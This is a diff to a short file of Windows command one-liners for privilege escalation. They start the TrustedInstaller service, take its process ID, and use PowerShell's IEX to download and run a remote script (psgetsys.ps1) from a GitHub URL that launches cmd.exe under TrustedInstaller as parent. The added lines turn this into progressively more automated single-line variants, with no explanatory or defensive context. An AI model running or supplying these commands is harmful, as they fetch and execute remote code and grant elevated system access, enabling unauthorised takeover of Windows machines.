@@ -1,2 +1,15 @@
 cmd.exe /c 'net start trustedinstaller & sc queryex trustedinstaller | find /i "pid"'
 powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/psgetsystem/master/psgetsys.ps1');[MyProcess]::CreateProcessFromParent(<PID_Value_From_Previous_Command>,'c:\windows\system32\cmd.exe')"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+$tsinstall = cmd.exe /c 'net start trustedinstaller & sc queryex trustedinstaller | find /i "pid"'
+$tsinecho = echo $tsinstall | Select-Object -Skip 3 | ? {$_.trim() -ne "" } | ForEach-Object {$_.Trim() -replace "\s+","," }
+$tsechdelim = echo ($tsinecho -split ',')[2]
+powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/psgetsystem/master/psgetsys.ps1');[MyProcess]::CreateProcessFromParent($tsechdelim,'c:\windows\system32\cmd.exe')"
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+$tsinstall = cmd.exe /c 'net start trustedinstaller & sc queryex trustedinstaller | find /i "pid"' | findstr PID | ? {$_.trim() -ne "" } | ForEach-Object {$_.Trim() -replace "\s+","," };$tsechdelim = echo ($tsinstall -split ',')[2];IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/psgetsystem/master/psgetsys.ps1');[MyProcess]::CreateProcessFromParent($tsechdelim,'c:\windows\system32\cmd.exe')
+
+------------------------------------------------------------------------------------------------------------------------------------------
